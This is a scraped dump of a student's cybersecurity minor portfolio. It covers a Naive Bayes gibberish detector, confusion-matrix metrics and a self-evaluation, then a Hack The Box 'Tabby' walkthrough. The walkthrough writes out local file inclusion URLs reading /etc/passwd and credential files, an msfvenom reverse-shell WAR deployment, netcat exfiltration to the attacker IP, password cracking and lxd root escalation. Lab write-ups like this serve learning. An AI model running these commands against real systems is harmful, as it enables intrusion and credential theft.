Gibberish detection - naive bayes \nFor the project where I had to analyze and conclude a hypothesis, I created a Machine Learning algortime by applying Naive Bayes. \nHereby I prepared different dataset and merged them. \n\nThe datasets used for this purpose consist of:\n| Dataset | Description | Label |\n| ----------- | ----------- | ----------- |\n| Amazon Reviews | Top review left under a product by customers | Positive (1) |\n| Youtube Cyptic comments | Spam comments left by users under videos | Negative (0) |\n| Gibberish | A dataset with random characters | Negative (0) |\n\nI labeled this dataset with code and made it usable for analysis. \nTo apply Naive Bayes, I used scikit-learn. \nNaive Bayes is a method for calculating the probability of something happening. \nIn the project, I use this because I want to calculate the probability that text is positive or negative in nature. \nThe probability is calculated by analyzing the dataset and attaching weights to it. \nFor example, how often does a specific word occur in a text. \nLet's use the words \"dog,\" \"toy,\" \"brown,\" and \"sunny\" as examples. \nSuppose the analysis shows that the word dog occurs as many as 100 times and the other words also occur around that range. \nThen we add a dataset with the characteristics of gibberish language. \nWeights are also attached to this. \nNow when we continue to make a prediction of the word \"sun\" it will always be positive. \nBut if we are going to predict the word \"adskladhjl\" it will be negative. \n\nSo to get this done we need to start training the algorithm below is an example of this. \n```py\n# Count word usage \nvectorizer = CountVectorizer(stop_words='english')\nall_features = vectorizer.fit_transform(df_merged.Response)\n\n# Split list into random train and test subsets\nx_train, x_test, y_train, y_test, = train_test_split(all_features, df_merged.Label, test_size=0.35) \n\nclassifier = MultinomialNB()  # Create Model (naive bayes) multinomial\nclassifier.fit(x_train, y_train)  # Train Model\n```\n\n\nIn my code, I use the multinomial Naive Bayes classifier. \\\nThis is suitable for classification with discrete features (e.g., word counts for text classification)\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fmachine_learning\u002Fminor_cyber_machine_learning_scores.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fmachine_learning\u002Fminor_cyber_machine_learning_scores.png\" alt=\"Machine learning main image\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nIt is very important for an algorithm that the accuracy is high. From the image above you can see that my algorithm can make a prediction for future data with a certainty of around 98%. \n\n# Workshop Tilburg\n\nDuring this workshop it was explained how machine learning could be applied to detect cyber attacks. Here we were given a presentation with the basic principles and techniques. We were then allowed to apply these within the supplied dataset. Because I already did two projects within this field it was not so difficult and it was easy because they used scikit learn. \n\n## Confusion Matrix\n\nWhen you are using machine learning algorithms it is useful to always test your dataset. This can be done with a confusion matrix when done you can see where your algorithm goes wrong and where it predicted wrong values. It gives you a general performance level of a classification model. \n\nBelow I am going to briefly explain how to read a confusion table: \n\n\u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fmachine_learning\u002Fconfusion_matrix.png\" alt=\"Machine learning main image\"\u002F\u003E\n\nas you can see the total predictions that this model did was 165. Within those 165 predictions it gave a total of 100 times yes when it was actually yes and it predicted no 50 times when it was actually no. But we can also see the errors we can for example see that it  predicted no 5 times when it was textually yes and 10 times yes when it was actually no. \n\n- 50 times No when it was actually no = true negatives \n- 100 times yes when it was actually yes = true positives \n- 5 times no when it was actually yes = true positives = type two error \n- 10 times yes when it was actually no = false positives = type one error\n\n\u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fmachine_learning\u002Fconfusion_matrix_sum.png\" alt=\"Machine learning main image\"\u002F\u003E\n\nThis is a list of rates that are often computed from a confusion matrix:\n\n- Accuracy: Overall, how often is the classifier corrrect? \n\n  - (TP+TN)\u002Ftotal = (100+50)\u002F165 = 0,91\n\n- Misclassification Rate (Error rate): Overall, how often is it wrong?\n\n  - (FP+FN)\u002Ftotal = (10+5)\u002F165 = 0.09\n\n- True Positive Rate: When it's actually yes, how often does it predict yes?\n\n  - TP\u002Factual yes = 100\u002F105 = 0.95\n\n    Also known as \"Sensitivity\" or \"Recall\"\n\n- False Positive Rate: When it's actually no, how often does it predict yes?\n\n  - FP\u002Factual no = 10\u002F60 = 0.17\n\n- True Negative Rate: When it's actually no, how often does it predict no?\n\n  - TN\u002Factual no = 50\u002F60 = 0.83\n\n    Equivalent to 1 minus False Positive Rate\n\n    Also known as \"Specificity\"\n\n- Precision: When it predicts yes, how often is it correct?\n\n  - TP\u002Fpredicted yes = 100\u002F110 = 0.91\n\n- Prevalence: How often does the yes condition actually occur in our sample?\n\n  - actual yes\u002Ftotal = 105\u002F165 =0.64\n\nBelow is a confusion matrix I made at the workshop in tilburg: \n\n\u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fmachine_learning\u002Fmachine_learning_confusion_matrix.png\" alt=\"Machine learning main image\"\u002F\u003E\n\nHere we can see that the table is bigger but the same principle remains. \n",readingTime:"10 min read"},{slug:C,description:D,title:E,image:F,category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},meta_data:{thank_reader:G},dir:i,path:"\u002Fprojects\u002Fminor\u002Fmalware-analysis",extension:g,createdAt:a,updatedAt:a,bodyPlainText:"\n# Learning Objectives\nThe learning objectives I want to cover this semester (some of which I want to develop for the current minor \"Cyber\") are as followed:\nMathematica\n\n\u003Cdiv class=\"table-one\"\u003E\n\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| Calculus    |             | Mathematics |\n| Logic       |            | Logical proof and reasoning |\n| Sets        |             | Set theory - study and formalization of sets |\n| Statistics  | X           | Statistics is the science and technique of collecting, processing, interpreting, and presenting data |\n| Algorithmics| X           | Algorithmics is obviously about algorithms. The course covers various general algorithmic methods for solving problems |\n\nLanguage\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| English C1  |             | Cambridge English level C1 Advanced |\n\nTooling\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| Machine learning | X       | Applied to forensics |\n| Python      | X            | For applying machine learning |\n| Vim         |              | For writing python in an effective way |\n\nCyber:\n| subject              | elaborate | explanation                                                  |\n| -------------------- | --------- | ------------------------------------------------------------ |\n| Forensics            | X         | Identification, acquisition, processing, analysis and reporting of data - (Individual) |\n| OSINT                | X         | Open-source intelligence - (Group project)                   |\n| Security Engineering | X         | Secure software development                                  |\n\n\u003C\u002Fdiv\u003E\n\n_I elaborate on the major learning objectives marked with an X below:_\n\nLearning Objectives and  their Assignments (Body of Knowledge).\n\n## Initial status knowledge\nPrior to this semester, I am going to get a clear vision about my knowledge. \nBecause of my previous cyber security specialization semesters, I can conclude that I have attained basic knowledge regarding these topics.\nOn the other hand, I have no prior knowledge regarding the learning objectives (stated above). \nWith this in mind I am going to immerse myself in these topics and make assignments that are going to prove that I have gained a basic knowledge to these topics.\n\n\n\u003Cstyle\u003E\n.table-one table th:first-of-type {\n    width: 10%;\n}\n.table-one table th:nth-of-type(2) {\n    width: 10%;\n}\n.table-one table th:nth-of-type(3) {\n    width: 50%;\n}\n.table-one table th:nth-of-type(4) {\n    width: 30%;\n}\n\u003C\u002Fstyle\u003E\n\n\n# PDR \n\n## Introduction \n\nThis page serves as a reading guide and also as my evaluation of the assignments made within the minor. We will focus on 3 aspects as described in the Cyber course. I will describe each learning objective briefly and give an evaluation. I will also talk about the group project and the tasks that we made within this group. I will also briefly show my peer assessment results as I have been assessed by my group members. In the conclusion, a reflection about all assignments is written; how it went and what could be better etc. \n\n## LO1 – Digital forensics \n\nMy specialization that I chose for this minor is Digital Forensics. This specialization is about collecting digital evidence that can show that an organization or person has performed things in a digital environment that are not acceptable. During this specialization route, I am going to look at ethical issues and the different possibilities within this specialization. I will also look at how tooling is used within an investigation. I will also shift my focus to the field of machine-learning and its applications within the cyber aspect. \n\nWhat a digital forensic does exactly can be read in my portfolio. Herein, I map out different topics and techniques. \n\n### Learning activies\n\n| Task                                             | Status | Pre-knowledge         |\n| ------------------------------------------------ | ------ | --------------------- |\n| Machine-learning Enron Dataset                   | Done   | None                  |\n| Machine-learning Gibbarish                       | Done   | None                  |\n| Machine-learning seclab                          | Done   | None                  |\n| Statistics formula’s                             | Done   | None                  |\n| Statistical research                             | Done   | None                  |\n| Captcha  mechanism                               | Done   | Some prior  knowledge |\n| Digital forensics methodology                    | Done   | None                  |\n| Course code cyber analysis (Secure code  review) | Done   | Prior  knowledge      |\n| Regular expressions “Regex” evil “Regex”         | Done   | Some prior  knowledge |\n| OSINT                                            | Busy   | None                  |\n| GDPR FDA 21 CFR Part 11                          | Busy   | Prior  knowledge      |\n| Pentest Methodology                              | Done   | Prior  knowledge      |\n| Own a linux system                               | Done   | None                  |\n| Algorithms                                       | Done   | Prior knowledge       |\n\n### Technical learning activities\n\nFor machine learning aspect I had to make a model that would detect so-called gibberish. This was part of a statistical research project where I was looking for a correlation between malicious URL's and gibberish. Since there was no open source model that would detect gibberish I had to make one myself. This was a challenge but I managed to make it work. After I got the model working I was able to write my research document for my statistical course. So these courses are connected to each other and have a cyber aspect to them. I also did some side project to further broaden my knowledge about other topics relating to cyber.  \n\n### Nontechnical learning activities\n\nThe non-technical learning activities are methodologies about different aspects within the Cyber security atmosphere. I also did some ethical research on topics of my interest. This gave me a broad view of what I can and can not do within my professional field.\n\n### Conclusion \n\nAs of now I have gained knowlegde in a number of technical learning objectives. I made this measurable by documenting the steps I took to get to my learning objectives. Before this, I did not have any prior knowledge in any of these topics so I have gained most of my knowledge during the execution of the assignments. It is fair to say that I have created a steady basis for myself to build up more knowledge regarding cyber related aspects.  \n\n## LO2\n\nThis chapter will address how I personally developed within the group project. In doing so, I will talk about the research and tasks I have made within the OSINT Project. I will also talk briefly about the communication within the group and the meetings with both the group members and stakeholders. \n\n### Project setting\n\nOSINT is an important part of the current state of the world. With OSINT, you can find a lot of information that is publicly known. Think about news websites, articles, social media and so on. Since Fontys wants to make their students more familiar with OSINT and the dangers and possibilities of it, we set up this project plan. The idea is to develop a CTF environment where students and government students can gain knowledge on how to use OSINT and what the possibilities and dangers are. At Fontys, government trainees and students come to learn what OSINT is all about. To keep this topic interesting, a fun and interactive way to demonstrate OSINT must be found. One way to accomplish this is a CTF related to OSINT. Capture the flags are a fun and interactive way to accomplish this.  \nThe goal is to develop a running, stable and reachable CTF system. Users should be able to play challenges independently and these challenges should have a storyline\u002Fgoal. Challenges are exercises that a user will have to perform in order to learn more about OSINT. Challenges should be fun and encouraging in order to motivate users to learn more. We also need to describe ethics and scenarios. With scenarios you can think of the Bellingcat and MH17 example. In challenges, users learn what tooling is applied, when it is applied and what tooling is available.\n\n### Contribution\n\nI was the scrum leader during the definition phase of the project. This meant that I was the first to define the tasks within the group and then assign them. I also have a big role within the creation of challenges within our platform. In doing so, I made sure that there was a set format and a set theme. The theme has to do with aliens who try to infiltrate our society. It is up to the trainee to track down these aliens. I have also contributed to the research within our group by helping to formulate the research questions and applying the .dot framework. I also made sure there was good communication within the group so that everyone knows what they are doing and the other way around. During the final sprint we showed all our challenges within our platform. We did this as a group in the form of a workshop with other students. These students gave feedback about our final challenges. After that we transformed the two group project is to one whole platform with combined challenges from both groups. \n\n### Conclusion \n\nFinally, in terms of my growth as an innovator, I have had experience expressing my ideas in the early stages of project development and sharing them with my colleagues. In addition, I have interacted with clients through interviews, meetings, a presentation, and reports.\n\n## LO3\n\nThis chapter will focus on a peer review of my project skills and feedback from my coach, stakeholders, and other external sources. It will also review and analyze things as well as my contributions to professional writing and communication tasks which include presenting, interviewing, relationship management and advising. It will also cover the ethical aspects of my professional development as a security professional.\n\n### Peerassement (1)\n\nBelow are the points that can be seen as given by my teammates within my project group. Score evaluation 1 t\u002Fm 5\n\n| ***Description\\***                                           | **Marks** | --   | --   | --   | --   |\n| ------------------------------------------------------------ | --------- | ---- | ---- | ---- | ---- |\n| *Comes up with  new, original, or usable ideas for the project* | 3         | 3    | 3    | 4    | 4    |\n| *Meets deadlines*                                            | 5         | 5    | 4    | 5    | 5    |\n| *Delivers quality work*                                      | 4         | 5    | 4    | 5    | 4    |\n| *Helps others*                                               | 4         | 4    | 5    | 4    | 4    |\n| *Brings up  problems, challenges, areas of concern for discussion* | 4         | 4    | 4    | 4    | 4    |\n| *Has a positive  effect on the group's work atmosphere*      | 5         | 5    | 5    | 5    | 5    |\n\n\u003Cstyle\u003E\ntable th:first-of-type {\n    width: 40%;\n}\ntable th:nth-of-type(2) {\n    width: 12%;\n}\ntable th:nth-of-type(3) {\n    width: 12%;\n}\ntable th:nth-of-type(4) {\n    width: 12%;\n}\ntable th:nth-of-type(5) {\n    width: 12%;\n}\n\u003C\u002Fstyle\u003E\n\n#### Strengths\n\n- Wanneer je bezig bent met iets, bijt je je er in vast. Altijd goede kwaliteit oplevering.\n- Works hard on creating new challenges and makes really creative and difficult ones.\n- Goede focus op je werkzaamheden\n- Works hard and shows others what you did. The work you do is always very good.\n\n#### Improvements \n\n- Communiceer gedurende de dag wat meer met het team\n- Mag gedurende de dag wat meer laten weten waar hij mee bezig is als hij niet aanwezig is.\n- Communiceer wat meer op een werkdag\n- Working very hard, maybe sometimes a bit too hard.\n\nAs you can see, the overall assessment is very positive. It is nice to hear that my groupmates think positively of me. This is very motivating to continue developing the project.\nNevertheless, there are also some things in which I can still improve myself. The most important point is communication. The first few weeks, this went very well but due to matters outside of school I was unable to come to school on location for the last two weeks. \n\n### Peerassement (2)\n\nBelow are the points that can be seen as given by my teammates within my project group. Score evaluation 1 t\u002Fm 4\n\n| ***Description\\***                                           | **Marks** | -- v | -- r | -- j | -- jo |\n| ------------------------------------------------------------ | --------- | ---- | ---- | ---- | ----- |\n| *Helps others*                                               | 4         | 3    | 3    | 4    | 4     |\n| *Takes responsibility within the project for the work to be done* | 4         | 3    | 3    | 4    | 4     |\n| *Open to receive feedback from others*                       | 4         | 3    | 4    | 4    | 4     |\n| *Capable of giving feedback to others*                       | 4         | 3    | 4    | 4    | 4     |\n| *Delivers results as agreed on (meets deadlines)*            | 4         | 3    | 4    | 4    | 4     |\n| *Particpates actively in group process*                      | 4         | 3    | 3    | 4    | 4     |\n| Cooperative attitude (team player)                           | 4         | 3    | 4    | 4    | 4     |\n| Contributes to group ambience                                | 4         | 3    | 4    | 4    | 4     |\n| Signals problems and contributes to solving them             | 4         | 3    | 4    | 4    | 4     |\n| Quality of work                                              | 4         | 3    | 4    | 4    | 4     |\n\n\u003Cstyle\u003E\ntable th:first-of-type {\n    width: 40%;\n}\ntable th:nth-of-type(2) {\n    width: 12%;\n}\ntable th:nth-of-type(3) {\n    width: 12%;\n}\ntable th:nth-of-type(4) {\n    width: 12%;\n}\ntable th:nth-of-type(5) {\n    width: 12%;\n}\n\u003C\u002Fstyle\u003E\n#### Strengths\n\n- Great focus on your tasks\n- Works very hard on assignments\n- works hard when at home\n- Betrokken en sociaal\n\n#### Improvements \n\n- Let others know what you're doing and maybe show them, this way they know what you're doing.\n\nAs you can see, the overall assessment is very positive. It is nice to hear that my groupmates think positively of me. I also see a improvement in my communication skills on a professional level. \n\n### Conclusion \n\nOverall, I have developed myself well this semester the feedback I received was generally very positive. there was a point of development for communication I worked on this and it is reflected in the reviews of my team members. Because of the alternating corona measures and consequences of working from home, it was sometimes difficult to switch. I did have trouble with that, but generally speaking the whole group did. Despite all this, it went well and we were able to deliver a nice product. \n\n### Professional writing\n\nFor the professional writing I chose to write my portfolio in English. Currently I am taking an English course to bring my English to a professional level so writing my portfolio in English is a very good exercise. I have also done different researches like the static research. This has also contributed to my professionalism so I have learned how to set up a hypothesis, do research and analyze the data. In the process I also learned how to draw a conclusion from the results as found in the research. \n\n### Ethical aspect. \n\nI have delved quite deeply into the ethical processes within the topics I cover. I have also done this for the group project. This has taught me how to approach certain things and what things cannot be done within the field and specialization. \n\n### Network\n\nDuring this minor I was actively searching graduating position in Software Engineering. For this I look some time to setup my LinkedIn profile. I have been in contact with multiple companies and chose one that took my interest. In doing so i expanded my social network on LinkedIn. I also developed the site you're looking at this during this minor. Within this site you can read about all the topic I covered. \n\n### Intercultural competence\n\nDuring this semester I followed an English C1 Cambridge course in the evening hours. The focus is mainly on cultural aspects and which words fit best in a situation to speak fluently and native. I also chose to write documentation in English this entire semester, and the workshops that were in English also contributed to this. \n\n## General Conslusion \n\nOverall, I think I learned a lot in this minor. In doing so, I placed my focus mainly on performing machine learning in the area of cyber. I had no prior knowledge of this topic. Now I have a broad scale of knowledge both technical and non technical aspects working on the group project and on the portfolio helped to improve my technical and non-technical and professional and innovations skills. I was happy in the way this minor was structured. It was very open minded I was free in learning about things of interest what I personally find very motivating. It was also allowed to combined different aspects within the cyber atmosphere. I did a lot of side projects that interested me I learned a lot about all of them and besides you really benefit if you are free in what you want to learn because you only learn what you are interested in. Finally, I would like to conclude this minor by thanking all the teachers, especially Stefan and Peter, for their great guidance. \n\nI will evetually graduate in the field of software-engineering, but all the knowledge I have gained during this minor is very valuable.",readingTime:H},{slug:"minor_own-a-linux-machine",description:J,title:J,duration:"2 days",image:q,tech:[{name:"pentest"},{name:"red-hat"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2022-01-10T00:00:00.000Z",dir:i,path:"\u002Fprojects\u002Fminor\u002Fown-a-linux-machine",extension:g,updatedAt:a,bodyPlainText:"\n# Own a Linux machine\n\nBecause I use a Linux operating system 'arch' daily. I was wondering how safe I really am on my Linux system when I don't update my packages regular. In this topic I will show my walkthrough of hacking the system named [Tabby](https:\u002F\u002Fwww.hackthebox.com\u002Fhome\u002Fmachines\u002Fprofile\u002F259). The machines host IP is 10.10.10.194. The machines difficulty level is set to be low, but then again I'm pretty new at hacking a linux system. First I connected via the VPN and tested the connection by pinging the IP given. \n\nI first started by scanning all the ports on the machine. This I did by running the following command: nmap -sV -sC -Pn scan 10.10.10.194\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fnmap.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fnmap.png\" alt=\"nmap\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nNmap show that there are a couple of services running with there operating port. We see that port 22 and 80 are open. We see the service name and the version name. \n\n| Port     | State | Service | Version                                             |\n| -------- | ----- | ------- | --------------------------------------------------- |\n| 22\u002Ftcp   | open  | ssh     | OpenSSH 8.2p1 Ununtu 4 (Ubuntu Linux; protocol 2.0) |\n| 80\u002Ftcp   | open  | http    | Apache httpd 2.4.41 ((Ubuntu))                      |\n| 8080\u002Ftcp | open  | http    | Apache Tomcat                                       |\n\nSo out this table we can conclude that a Apache web server is running on port 80. When we visit the IP with the given port in a browser we get to see the follow site.\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fwebpage.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fwebpage.png\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nMost of the links on the page are dead, after some enumeration on the webpage I found a url which is redirecting to the http:\u002F\u002Fmegahosting.htb\u002Fnews.php?file=statement. So I replaced megahosting.htb with my ip and even added megahosting.htb to \u002Fetc\u002Fhosts. The site is the same, but now the links work. After visiting that site I found that the webpage is vulnerable to Local File Inclusion. It can be confirmed by this URL\n\nview-source:http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002F..\u002Fetc\u002Fpasswd \n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Floaded-page.webp\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Floaded-page.webp\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nBut we also have port 8080 that is running Apache Tomcat by visiting this port in our browser we get the following:\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-page.webp\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-page.webp\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nIn this page there are a couple of useful links. It gives us links to the manager webapp and the host-manager webapp. After some research we know that tomcat users are stored in the following directory file etc\u002Ftomcat9\u002Ftomcat-users.xml or by locate tomcat-users.xml.\n\n\u002Fetc\u002Ftomcat9\u002Ftomcat-users.xml\n\u002Fusr\u002Fshare\u002Ftomcat9\u002Fetc\u002Ftomcat-users.xml\n\u002Fvar\u002Flib\u002Fucf\u002Fcache\u002F:etc:tomcat9:tomcat-users.xml\n\nAfter that we can use our file inclusion by \n\nview-source: http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002Fetc\u002Ftomcat9\u002Ftomcat-users.xml \n\nBut nothing shows up. I got to know that configuration files are saved in usr\u002Fshare. Searching more i tried the URL \n\nview-source: http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002F..\u002F..\u002Fusr\u002Fshare\u002Ftomcat9\u002Fetc\u002Ftomcat-users.xml\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-password.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-password.png\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nSo the username and password for tomcat host-manager is tomcat :\n\nUsername = tomcat\nPassword = $3cureP4s5w0rd123!\nRoles = admin-gui, manager-script\n\nLet’s login with these credentials and enumerate the gui-panel.\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fhost-manager.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fhost-manager.png\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nI never worked in this panel so I had to watch some documentation first to understand it. I couldnt really do anything so in the documentation I found there was an api.\n\n\n\nWe can still deploy the `.war` file via `curl`. First, let’s make a reverse shell payload with `msfvenom`:\n\n### Create Reverse Shell\n\nmsfvenom -p java\u002Fjsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f war \u003E my_reverse_shell.war\n\nThen, using `curl`, deploy the payload:\n\n### Upload Reverse Shell\n\ncurl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file my_reverse_shell.war 'http:\u002F\u002F10.10.10.194:8080\u002Fmanager\u002Ftext\u002Fdeploy?path=\u002Fmy_reverse_shell'\n\nOnce deployed, by accessing the URL on a browser, we can trigger the payload to call back to our listener.\n\n### Start Netcat Listener\n\nnc -nvlp 1234\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Freverse-shell.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Freverse-shell.png\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nFurther enumeration found that there is a directory called `\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles` which is owned by the user `ash`.\n\n```\nls -la\ntotal 48\ndrwxr-xr-x 4 root root  4096 Jun 17 16:24 .\ndrwxr-xr-x 3 root root  4096 May 21 10:31 ..\ndrwxr-xr-x 6 root root  4096 Mar 31  2016 assets\n-rw-r--r-- 1 root root   766 Jan 13  2016 favicon.ico\ndrwxr-xr-x 4 ash  ash   4096 Jun 17 21:59 files \n-rw-r--r-- 1 root root 14175 Jun 17 16:24 index.php\n-rw-r--r-- 1 root root  2894 May 21 11:42 logo.png\n-rw-r--r-- 1 root root   123 Jun 16 11:19 news.php\n-rw-r--r-- 1 root root  1574 Mar 10  2016 Readme.txt \n```\n\nWithin the files directory, there is an backup zip file.\n\n```\nls -la\ntotal 36\ndrwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 .\ndrwxr-xr-x 4 root root 4096 Jun 17 16:24 ..\n-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip\ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 archive \ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs \n-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement\n```\n\nAnd using the following \"netcat\" commands, we can download the .zip\" file to our Kali box:\n\n```\n# Kali Box\n$ nc -lvnp 80 \u003E backup.zip\n\n# Tabby Box\n$ nc 10.10.14.3 80 \u003C 16162020_backup.zip\n```\n\n```\nunzip backup.zip \nArchive:  backup.zip\n\tcreating: var\u002Fwww\u002Fhtml\u002Fassets\u002F\n [backup.zip]  var\u002Fwww\u002Fhtml\u002Ffavicon.ico password:\n password incorrect--reenter:\n \tskipping: var\u002Fwww\u002Fhtml\u002Ffavicon.ico  incorrect password\n \tcreating: var\u002Fwww\u002Fhtml\u002Ffiles\u002F\n \tskipping: var\u002Fwww\u002Fhtml\u002Findex.php  incorrect password\n \tskipping: var\u002Fwww\u002Fhtml\u002Flogo.png   incorrect password \n \tskipping: var\u002Fwww\u002Fhtml\u002Fnews.php   incorrect password\n \tskipping: var\u002Fwww\u002Fhtml\u002FReadme.txt  incorrect password \n```\n\nWe can use \"zip2john\" and \"john\" to potentially crack the password\n\n### zip2john\nzip2john backup.zip \u003E bkcup-prep.zip\n\n### John \njohn --wordlist=\u002Fusr\u002Fshare\u002Fwordlists\u002Frockyou.txt bakcup-prep.zip\n\n```\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32\u002F64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nadmin@it \t\t(backup.zip)\n1g 0:00:00:02 DONE (2022-01-10) 0.3759g\u002Fs 3895Kp\u002Fs 3895Kc\u002Fs 3895KC\u002Fs adnc153..adenabuck\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession compledted\n```\n\nAnd it cracked the password as \"admin@it\"\n\n```\ntomcat@tabby: \u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ su ash\nsu ash\nPassword: admin@it\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ id\nuid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ cat \u002Fhome\u002Fash\u002Fuser.txt\ncat \u002Fhome\u002Fash\u002Fuser.txt\ne43c28adc365eca134046f4217125178\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$\n```\n\nNow we have user access \n\n# Root privilege \n\nFrom the above result, we can see that \"ash\" is member of the \"lxd\" group.\n\nThe following links provide some great information into the `lxd` group and exploiting it:\n\n- https:\u002F\u002Fethicalhackingguru.com\u002Fthe-lxd-privilege-escalation-tutorial-how-to-exploit-lxd\u002F\n- https:\u002F\u002Fwww.hackingarticles.in\u002Flxd-privilege-escalation\u002F\n\nA member of the local \"lxd\" group can effectively escalate the privileges on the host operating system to root in an instant. This is true whether or not the person has been granted sudo access, and it does not need them entering their password. Even with the LXD snap package, the vulnerability persists. This is because LXD is a root process that performs activities for anybody with write access to the LXD UNIX socket, and it frequently ignores the calling user's rights.\n\nWe'll need the alpine-builder package to take use of this. I used git clone to obtain the package: git clone https:\u002F\u002Fgithub.com\u002Fsaghul\u002Flxd-alpine-builder.git and then transferred it to the tabby host using a python web server hosted on my kali machine. I was able to transfer it using curl -O from there. We needed to build it using the following commands after we had the alpine package on the host:\n\n````\ncd lxd-alpine-builder\nsudo .\u002Fbuild-alpine\n````\n\nFrom there, I needed to configure LXD, so I started the LXD initialization process with the \"lxd init\" comman. After the image has been built it can be added as an image to LXD as follows:\n\n```\nlxc image import .\u002Fapline-v3.10-x86_64-20191008_1227.tar.gz --alias hotshoto\n```\n\nNow that I have created a new lxd container, as a final step I needed to give the container security privileges and then set its mount path as \"\u002Fmnt\" using the following commands:\n\n```\nlxc init newalpine hotshoto -c security.privileged=true\nlxc config device add hotshoto container disk source=\u002F path=\u002Fmnt\u002Froot recursive=true\n```\n\nWith everything configured, I could start the new image using the following commands:\n\n```\nlxc start hotshoto\nlxc exec hotshoto \u002Fbin\u002Fsh\n```\n\n```\nash@tabby: lxc exec hoc hotshoto \u002Fbin\u002Fsh\n# Whoami\nroot \n# echo \" \"; echo \"uname -a:\";uname -a;echo \" \";echo \"hostname:\";hostname;echo \"\";echo \"id\";echo; \" \";echo \"ifconfig:\";\u002Fsbin\u002Fifconfig -a; echo \" \";echo \"groups:\";groups;\n\nuname -a:\nLinux hotshoto 5.4.0.31-generic #35-Ubuntu SMP Thu Jan 11 20:20:34 UTCH 2022 x86_64 Linux\n\nhostname:\nhotshoto\n\nid\nuid=0(root) gid=0(root)\n\nifconfig:\neth0\t\tLink encap:Ethernet   HWaddr 00:16:3E:F4:23:06\n\t\t\tinet addr:10.52.139.131  Bcast:10.52.139.255  Mask:255.255.255.0\n\t\t\tinet6 addr: fd42:b312:e739:9016:216:3eff:fef4:2306\u002F64 Scope:\n```\n\n\n\nAfter running the bash file, we see that we have a different shell which is the shell of the container. This container has all the files of the host machine and in order to browse the root object, we simply needed to navigate to \"\u002Fmnt\u002Froot\" to see all resources from the host machine. That’s the box! I\n",readingTime:l},{slug:"minor_pentest-methodology",description:"Pentest Methodology. Phases and frameworks used during pen-tests.",id:j,title:"Pentest 